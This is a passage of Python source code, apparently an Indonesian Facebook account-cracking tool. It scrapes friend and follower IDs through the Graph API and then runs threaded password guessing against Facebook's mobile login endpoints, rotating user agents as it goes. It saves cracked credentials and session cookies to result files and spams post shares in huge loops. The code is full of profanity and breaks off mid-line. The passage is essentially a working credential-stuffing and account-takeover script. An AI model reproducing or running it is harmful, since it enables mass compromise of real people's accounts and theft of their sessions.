				id.append(uid+"<=>"+nama)
				dump.write(uid+'<=>'+nama+'\n')
			dump.close()
		except KeyError:pass
		id_ = ("%s"%(len(id)))
		if id_ == "0" or "0" == id_:
			jalan(" |-->Kemungkinan Id "+idt+" Ini Tidak DiPublickan !!")
			time.sleep(2)
			self.cek_jumlah_teman()
		else:
			print(" |-->Total ID : %s"%(len(id)))
			with __Kiky__(max_workers=20) as (kiky_gtg):
				juma = open(".janganedit","r").readlines()
				for data in juma:
					data = data.replace("\n","")
					kiky = data.split("<=>")
					mal = ("%s"%(kiky[0]))
					nm = ("%s"%(kiky[1]))
					kiky_gtg.submit(self.lonte_, mal, toket, token)
	def lonte_(self, ml, token, toket):
		try:
			goblok = []
			tolol = []
			r = requests.get("https://graph.facebook.com/"+ml+"?fields=friends.fields(id,name)&access_token="+token)
			z = json.loads(r.text)["friends"]
			for i in z["data"]:
				anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol = i["id"]
				goblok.append(anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol)
			for i in requests.get("https://graph.facebook.com/"+ml+"/subscribers?limit=9999&access_token="+token).json()["data"]:
				anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol_asw = i["id"]
				tolol.append(anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol_asw)
		except KeyError:pass
		_id = ("%s"%(len(goblok)))
		_idx = ("%s"%(len(tolol)))
		if _id == "0" or "0" == _id:
			voa = ("Teman : %s0%s"%(U,Q))
		else:
			voa = ("Teman : %s%s%s"%(U,_id,Q))
		if _idx == "0" or "0" == _idx:
			voax = ("Pengikut : %s0%s"%(I,Q))
		else:
			voax = ("Pengikut : %s%s%s"%(I,_idx,Q))
		if voa == "" or "" == voa:pass
		else:
			print (f" |-->{O}{ml}{Q}<--|-->{C}{voa}{Q}<--|-->{voax}")
	def cekfile_crk(self, folder):
		dirs = os.listdir(folder)
		for file in dirs:
			filex = (folder+"/"+file)
			try:
				juma = open(filex,"r").readlines()
				total = ("%s"%(str(len(juma))))
			except:total = (" ?? ")
			try:ijo__ = filex.split("Hasil/OK-")[1];ijo_ = (Q+" |-->"+I+"Hasil/OK-"+ijo__);print(ijo_+Q+" <--|--> "+Q+M+total+Q)
			except:pass
			try:kuning__ = filex.split("Hasil/CP-")[1];kuning_ = (Q+" |-->"+K+"Hasil/CP-"+kuning__);print(kuning_+Q+" <--|--> "+Q+M+total+Q)
			except:pass
	def rek(self):
		self.cekfile_crk("Hasil")
		namax=input(" |-->Nama File : ")
		try:
			fila=open(namax,"r").readlines()
		except FileNotFoundError:
			jalan(" |-->Maaf File Tidak DiTemukan")
			self.rek()
		try:
			volak = namax.split("CP-")[1];copy_ri = ("CP");Ass = ("%s"%(K));aSs = K
		except:
			try:
				vok = namax.split("OK-")[1]
				copy_ri = ("OK")
				Ass = ("%s"%(I))
				aSs = I
			except:
				copy_ri = ("Vvip")
				Ass = ("%s"%(C))
				aSs = M
		print(" |-->Jumlah Akun :",len(fila),"\n")
		with __Kiky__(max_workers=30) as (form):
			for data in fila:
				try:
					data = data.replace("\n","")
					try:user,pw,tll = data.split("|")
					except:user,pw = data.split("|");tll=(" - ")
					print(f" {Q}|-->{Ass}{copy_ri}{Q}. {aSs}{user}|{pw}|{tll}{Q}")
				except:pass
				time.sleep(0.01)
	def cek_apk_hasil_crk(self):
		self.cekfile_crk("Hasil")
		nama_z = input(" |-->Nama File : ")
		if nama_z == "":jalan(" |-->Jangan Kosong Sayang");time.sleep(2);exit()
		try:total__ = len(open(nama_z,"r").readlines())
		except FileNotFoundError:jalan(" |-->Maaf File Tidak Ada");exit()
		jalan(" |-->Total Akun : "+I+str(total__)+Q)
		with __Kiky__(max_workers=7) as (form):
			for data in open(nama_z,"r").readlines():
				data = data.replace("\n","")
				try:user, pw = data.split("|")
				except:user, pw, coki = data.split("|")
				bajingan = ('\r%s |-->%s %s|%s|%s                 ' % (Q,I,user,pw,coki))
				form.submit(cek_cookies_by_risky, user, coki, bajingan)
		exit()
	def check_opsii(self):
		print(" |")
		self.cekfile_crk("Hasil")
		print(" |")
		namax=input(" |-->Nama File : ")
		try:
			fila=open(namax,"r").readlines()
		except FileNotFoundError:
			jalan(" |-->Maaf File Tidak Ditemukan..")
			time.sleep(2)
			self.check_opsii()
		jalan(" |-->Sebelum Lanjut Harap Hidup Matikan Mode Pesawat Selama 2.Detik")
		print(" |-->Total Akun Yang Check Point : %s%s%s"%(O,len(fila),Q))
		print(" |")
		print(" |")
		for memek in fila:
			kontol = memek.replace("\n","")
			titid  = kontol.split("|")
			print(" |")
			print(" |-->%s"%(kontol))
			try:crackmenu("Memek").cek_opsi_cp(titid[0], titid[1])
			except requests.exceptions.ConnectionError:pass
			except:pass
		print(" |")
		jalan(" |-->Check Akun Sudah Selesai....")
		os.sys.exit()

	def proses_(self, token, idz, opostt):
		h1 = {'authority':'graph.facebook.com','cache-control':'max-age=0','sec-ch-ua-mobile':'?0','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.66 Safari/537.36'}
		dancok=requests.post(f"https://graph.facebook.com/me/feed?link="+idz+"&published=0&access_token="+token,headers=h1).text
		if 'id' in dancok:
			id_p = json.loads(dancok)['id']
			print(f" |-->{str(opostt)}. Berhasil Share Postingan {I}{id_p}{Q}")
		else:
			print(" |-->Gagal Share Postingan")

	def Share_Post_v2(self):
		global opost
		try:
			token_me = open(".login.txt","r").read()
		except:
			login()
			os.sys.exit()
		print(" |")
		jalan(" |-->Masukan Link Postingan Anda..")
		idz_post = input(" |-->Target Post : ")
		print(" |")
		print(" |")
		with __Kiky__(max_workers=5) as (form):
			for a in range(99999999):
				opost += 1
				form.submit(self.proses_,token_me,idz_post,opost)
		os.sys.exit(" |-->Jika Berhenti Sendiri Cobalah Ganti Token")

	def share_post(self):
		sukkses = 0
		def cept_(idpost):
			token = open(".login.txt", "r").read()
			toket = open(".login.txt", "r").read()
			try:
				requests.get('https://graph.facebook.com/v2.0/me/feed?method=post&privacy={"value":"EVERYONE"}&message=&link=https://mbasic.facebook.com/'+str(idpost)+'&access_token='+str(token))
			except:pass
		try:
			token = open(".login.txt", "r").read()
			toket = open(".login.txt", "r").read()
		except IOError:
			os.system("rm -rf .login.txt")
			os.sys.exit(war+"Token Failed !!");time.sleep(2)
		idpostt = input(' |-->Idz Post : ')
		if idpostt in (""," "):
			jalan(' |-->Jangan Kosong...');time.sleep(2)
			self.share_post()
		try:limit = int(input(' |-->Limit Share : '))
		except:limit = 100
		try:time_delay = int(input(' |-->Waktu Delay : '))
		except:time_delay = 1
		print(" |")
		jalan(f" |-->{O}Share Post Sedang Berjalan Harap Tunggu Hingga Selesai...{Q}")
		jalan(f" |-->{O}Silahkan Check Postingan Yang Anda Share Apakah Berjalan...{Q}")
		print(" |")
		with __Kiky__(max_workers=2) as (form):
			for t in range(limit):
				sukkses += 1
				sys.stdout.write(f'\r |-->{Q}{O}{sukkses}{Q}.{I}Berhasil Share Post{Q} : {str(idpostt)}'),
				sys.stdout.flush();time.sleep(time_delay)
				form.submit(cept_, idpostt)
		jalan("\n |-->Berhasil Share Link...")
		os.sys.exit()
	def menujuwa(self):
		no_wa = "6285929340724"
		url_wa = ("https://api.whatsapp.com/send?phone="+no_wa+"&text=Report") # UBAH NOMOR HP KAMU
		subprocess.check_output(["am", "start", url_wa])
	def hide_tkn(self):
		try:
			token = open(".login.txt", "r").read()
		except IOError:
			os.system("rm -rf .login.txt")
			exit(war+"Token Failed !!");time.sleep(2)
		try:
			cokes = open(".cookie.txt", "r").read()
		except:
			cokes = ""
		try:
			vv = ses.get("https://graph.facebook.com/me?access_token="+token)
			va = json.loads(vv.text)
		except:pass
		try:namaq = va["name"]
		except:namaq = ""
		try:id_a = va["id"]
		except:id_a = ""
		try:userr = va["username"]
		except:userr = ""
		try:ttl = va["birthday"]
		except:ttl = ""
		jalan(f""" |
 |-->Nama Facebook : {O}{namaq}{Q}
 |-->Tanggal Lahir : {O}{ttl}{Q}
 |-->Idz Facebook  : {O}{id_a}{Q}
 |-->Username      : {O}{userr}{Q}
 |
 |-->Token : {II}{token}{Q}
 |-->Cookie: {U}{cokes}{Q}
 |""")
 
 
 # USER AGENT
def user_agentAPI():
	ugent =[
	    "Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36",
	    "Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3396.81 Mobile Safari/537.36",
	    "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36",
	    "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12",
	    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
	    "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)",
        "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
        "NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)",
        "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2",
        "Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 5.1.1; Navori QL Stix 3500 Build/LMY49F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 7.0; SM-G930F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]",
        "Mozilla/5.0 (Linux; Android 7.0; MHA-L29 Build/HUAWEIMHA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]",
       "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 [FBAN/FBIOS;FBAV/96.0.0.45.70;FBBV/60548545;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/E-Plus;FBID/phone;FBLC/de_DE;FBOP/5;FBRV/0]",
       "Mozilla/5.0 (Linux; Android 4.4.4; G7-L01 Build/HuaweiG7-L01) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/121.0.0.15.70;]",
       "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
       "Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]",
       "[FBAN/FB4A,FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI,.FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19.FBCA/armeabi-v7a:armeabi,]"]
	rand_ua = random.choice(ugent)
	return rand_ua
	
def useragent():
	print ("\n%s%s%s 01 %sGanti user agent "%(U,til,P,O))
	print ("%s%s%s 02 %sCek user agent "%(U,til,P,O))
	print ("%s%s%s 00 %sKembali "%(U,til,M,O))
	_romz_ = input('\n%s#%s Pilih%s >%s '%(P,O,M,K))
	uas(_romz_)
	
def uas(_romz_):
	if _romz_ == '':
		print ('%s%s isi yang benar'%(M,til));jeda(2)
		uas(_romz_)
	elif _romz_ in("1","01"):
		print ("%s%s%s Ketik %sMy user agent%s di browser google chrome\n%s%s%s untuk gunakan user agent anda sendiri"%(U,til,O,H,O,U,til,O))
		print ("%s%s%s Ketik %sCancel%s untuk gunakan user agent bawaan tools"%(U,til,O,H,O))
		ua = input("%s%s%s Enter user agent %s: %s"%(U,til,O,M,K))
		if ua in(""):
			print ("%s%s isi yang benar "%(M,til));jeda(2)
			menu()
		elif ua in("my user agent","My User Agent","MY USER AGENT","My user agent"):
			jalan("%s%s%s Anda akan di arahkan ke browser "%(U,til,O));jeda(2)
			os.system("am start https://www.google.com/search?q=My+user+agent>/dev/null");jeda(2)
			useragent(_romz_)
		elif ua in("CANCEL","Cancel","cancel"):
			ua_ = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
			open("ua.txt","w").write(ua_);jeda(2)
			print ("\n%s%s menggunakan user agent bawaan "%(H,til));jeda(2)
			menu()
		open("ua.txt","w").write(ua);jeda(2)
		print ("\n%s%s berhasil mengganti user agent"%(H,til));jeda(2)
		menu()
	elif _romz_ in("2","02"):
		try:
			ua_ = open('ua.txt', 'r').read();jeda(2)
			print ("%s%s%s user agent anda%s : %s%s"%(U,til,O,M,H,ua_));jeda(2)
			input('\n%s%s%s [%s Enter%s ] '%(U,til,O,U,O))
			menu()
		except IOError:
			ua_ = '%s-'%(M)
	elif _romz_ in("0","00"):
		menu()
	else:
		print ('%s%s isi yang benar'%(M,til));jeda(2)
		uas(_romz_)




class crackmenu:
	def __init__(self,isifile):
		self.id = []
	def menu_crack(self):   # METHOD AUTO PASSWROD
		print(' ')
		jalan(war+"Silahkan Pilih Metode Login !")
		print(' ')
		jalan(" ┌──────────────── Metode ─────────────────┐")
		print(Q+" |-->1. B-Api Free   V1                    |");time.sleep(0.02)
		print(Q+" |-->2. Mobile V2                          |");time.sleep(0.02)
		print(Q+" |-->3. Mobile V3 ("+II+"Recommended V4"+Q+")         |");time.sleep(0.02)
		print(Q+" |-->4. Mbasic V1 ("+II+" Best Cloning V1"+Q+")         |");time.sleep(0.02)
		print(Q+" |-->5. Mbasic V2 ("+II+"Recommended V2"+Q+")          |");time.sleep(0.02)
		print(Q+" |-->6. Mbasic V3                          |");time.sleep(0.02)
		print(' └─────────────────────────────────────────┘')
	def menu_crack_m(self):   # METHOD MANUAL PASSWORD
		jalan(war+"Please Select Login Method !")
		print(' |')
		jalan(" |-->Please try one by one, don't forget to turn on and off airplane mode")
		print(Q+" |-->1. Mobile V1 ");time.sleep(0.02)
		print(' |')
	def pro_ses(self):
		print(' ┌─────────────────────────────────────────────────────────┐')
		jalan(f" |-->CP Crack Results DiSimpan : {K}Results/CP-{O}{durasi}{K}.txt{Q}|")
		jalan(f" |-->Results Crack OK Saved : {II}Results/OK-{O}{durasi}{II}.txt{Q}|")
		print(' └─────────────────────────────────────────────────────────┘')
	def passmenu(self,isifile):
		try:
			self.apk = isifile
			self.id = open(self.apk).read().splitlines()
		except:print(war+'File Not Found! Try Again');time.sleep(2);menu()
		cjj = open(".paww", "w")
		print(' |')
		print(' |-->Do you want to use manual password :')
		print(' |-->Manual/Default')
		print(' |')
		zk = input(' |-->select (M/D): ')
		print(" |")
		if zk in ('m','M','Manual','manual'):
			while True:
				jalan(war+"Contoh Password : sayang,123456")
				pwx = input(" |-->Input Password : ")
				jalan("%sPassword Yang DiGunakan : %s%s"%(war,I,pwx))
				if pwx == '':jalan(" |-->Isi Password Dengan Benar !!")
				elif len(pwx)<=5:jalan(" |-->Password Minimal 6 Huruf !!")
				else:self.menu_crack_m()
				jm = input(" |-->Pilih :")
				if jm == "":
					jalan(war+"Isi Dengan Benar Lah Kentot");time.sleep(1)
					crackmenu(isifile).passmenu(isifile)
				elif jm == "1" or jm == "01":
					self.pro_ses()
					def mobile_n(zsc=None):
						with __Kiky__(max_workers=35) as (form):
							for uid in self.id:
								try:userid = uid.split('<=>')[0];form.submit(self.metode,userid,zsc,"mbasic.facebook.com")
								except: pass
							os.remove(self.apk);exit(war+"Done !!")

					mobile_n(pwx.split(','))
				else:jalan(war+"Isi Dengan Benar Lah Kentot");time.sleep(1);crackmenu(isifile).passmenu(isifile)

		elif zk in ('d', 'D','Default','default'):
			self.menu_crack() #Pilihan Method
			jm = input(war+"Pilih :")
			if jm == "":jalan(war+"Isi Dengan Benar Lah Kentot");time.sleep(1);crackmenu(isifile).passmenu(isifile)
			elif jm == "1" or jm == "01":
				self.Opsi_v1()
			elif jm == "2" or jm == "02":
				self.Opsi_v2()
			elif jm == "3" or jm == "03":
				self.Opsi_v3()
			elif jm == "4" or jm == "04":
				self.Opsi_v4()
			elif jm == "5" or jm == "05":
				self.Opsi_v5()
			elif jm == "6" or jm == "06":
				self.Opsi_v6()
			else:jalan(war+"Isi Dengan Benar Lah Kentot");time.sleep(1);crackmenu(isifile).passmenu(isifile)
		else:jalan(war+"Isi Dengan Benar Lah Kentot");time.sleep(1);crackmenu(isifile).passmenu(isifile)
	def free_v1(self, user, kiky__gtg):
		global ok,cp,loop,infoong
		sys.stdout.write('\r%s |-->%s%s%s %s/%s OK:%s CP:%s %s'%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,loop,len(self.id),len(ok),len(cp), Q)),
		sys.stdout.flush()
		if "" == "":
			for pw in kiky__gtg:
				pw = pw.lower()
				user_gg = pilih([
					"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
					"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"
					"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"
				])
				session = requests.Session()
				session.headers.update({"Host":"free.facebook.com","upgrade-insecure-requests":"1","user-agent":user_gg,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
				p = session.get('https://free.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
				dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
				_headers = {"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://free.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
				po = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
				if 'c_user' in session.cookies.get_dict():
					coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
					wrt = '%s|%s|%s' % (user,pw,coki)
					ok.append(wrt)
					open('Hasil/OK-'+durasi+'.txt','a').write('%s\n' % wrt)
					zczc = ('\r%s |-->%s%s|%s|%s                 ' % (Q,I,user,pw,coki))
					cek_cookies_by_risky(user, coki, zczc);play_mpv(".Wiii.mp3")
					break
				elif 'checkpoint' in session.cookies.get_dict():
					try:kontol = open('.login.txt').read();cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday'];month, day, year = cp_ttl.split('/');month = bulan_ttl[month];print('\r%s |-->%s%s|%s|%s %s %s       ' % (Q,K,user,pw,day,month,year));wrt = '%s|%s|%s %s %s' % (user,pw,day,month,year);cp.append(wrt);open('Hasil/CP-'+durasi+'.txt','a').write('%s\n' % wrt);break
					except (KeyError, IOError):month = '';day   = '';year  = ''
					except:pass
					print('\r%s |-->%s%s|%s                 ' % (Q,K,user,pw));wrt = '%s|%s' % (user,pw);cp.append(wrt);open('Hasil/CP-'+durasi+'.txt','a').write('%s\n' % wrt);play_mpv(".Wiii.mp3")
					break
				else:continue
			loop += 1

	def mobile_v2(self, user, kiky__gtg):
		global ok,cp,loop,infoong
		sys.stdout.write('\r%s |-->%s%s%s %s/%s OK:%s CP:%s %s'%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,loop,len(self.id),len(ok),len(cp), Q)),
		sys.stdout.flush()
		if "" == "":
			for pw in kiky__gtg:
				pw = pw.lower()
				user_gg = pilih([
					"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
					"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"
				])
				session = requests.Session()
				session.headers.update({"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":user_gg,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://developers.facebook.com/","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
				p = session.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
				dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
				po = session.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
				if 'c_user' in session.cookies.get_dict():
					coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
					wrt = '%s|%s|%s' % (user,pw,coki)
					ok.append(wrt)
					open('Hasil/OK-'+durasi+'.txt','a').write('%s\n' % wrt)
					zczc = ('\r%s |-->%s%s|%s|%s                 ' % (Q,I,user,pw,coki))
					cek_cookies_by_risky(user, coki, zczc);play_mpv(".Wiii.mp3")
					break
				elif 'checkpoint' in session.cookies.get_dict():
					try:kontol = open('.login.txt').read();cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday'];month, day, year = cp_ttl.split('/');month = bulan_ttl[month];print('\r%s |-->%s%s|%s|%s %s %s       ' % (Q,K,user,pw,day,month,year));wrt = '%s|%s|%s %s %s' % (user,pw,day,month,year);cp.append(wrt);open('Hasil/CP-'+durasi+'.txt','a').write('%s\n' % wrt);break
					except (KeyError, IOError):month = '';day   = '';year  = ''
					except:pass
					print('\r%s |-->%s%s|%s                 ' % (Q,K,user,pw));wrt = '%s|%s' % (user,pw);cp.append(wrt);open('Hasil/CP-'+durasi+'.txt','a').write('%s\n' % wrt);play_mpv(".Wiii.mp3")
					break
				else:continue
			loop += 1


	def mobile_v3(self, user, kiky__gtg):
		global ok,cp,loop
		sys.stdout.write('\r%s |-->%s%s%s %s/%s OK:%s CP:%s %s'%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,loop,len(self.id),len(ok),len(cp), Q)),
		sys.stdout.flush()
		if "" == "":
			for pw in kiky__gtg:
				pw = pw.lower()
				session = requests.Session()
				session.headers.update({"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":"[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
				p = session.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
				dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
				session.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment 